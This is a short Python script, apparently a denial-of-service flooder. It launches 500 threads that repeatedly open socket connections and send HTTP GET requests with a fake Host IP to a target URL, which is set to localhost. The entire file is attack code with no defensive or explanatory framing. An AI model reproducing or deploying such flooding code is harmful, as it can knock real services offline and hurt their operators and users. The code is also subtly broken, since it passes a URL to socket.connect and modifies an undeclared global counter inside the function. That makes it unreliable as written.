import socket
import threading

target = 'http://127.0.0.1:8000/'
fake_ip = '182.21.20.32'
port = 80

def attack(forever = False):
  '''
  function for generate dos attack
  Parameters
  ----------
  forever : bool
    if set to True, the attack will be generate forever.
  '''
  while forever | attack_num>0:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
      
      attack_num -= 1
      print(attack_num)
        
      s.close()

for i in range(500):
    global attack_num # number of dos attack
    attack_num = 1000 # set to low number for test purposes
    thread = threading.Thread(target=attack)
    thread.start()